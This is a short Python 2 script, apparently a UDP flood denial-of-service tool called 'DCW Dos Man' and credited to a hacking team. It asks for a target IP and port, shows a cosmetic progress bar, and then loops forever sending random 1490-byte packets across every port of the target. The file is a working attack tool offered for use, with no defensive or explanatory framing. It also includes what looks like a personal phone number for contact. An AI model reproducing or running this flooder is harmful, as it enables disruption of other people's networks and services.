import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DCW Dos Man")
print
print "Author   : BLACK HYDRA"
print "Team : DECEPTICONS CYBER WARRIORS"
print "YOUTUBE   : DCW OFFICIAL"
print "contact : http://Wa.me/+917902626583"
print
ip = raw_input("Target IP : ")
port = input("Enter Port    : ")

os.system("clear")
os.system("figlet DCW Dos Man Runing")
print "[+]--                  [+]0% "
time.sleep(5)
print "[+]-xxxx>             [+] 25%"
time.sleep(5)
print "[+]-xxxxxxx>              [+]   50%"
time.sleep(5)
print "[+]-xxxxxxxxx>          [+]      75%"
time.sleep(5)
print "[+]-xxxxxxxxxxxxxxx>      [+]   100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

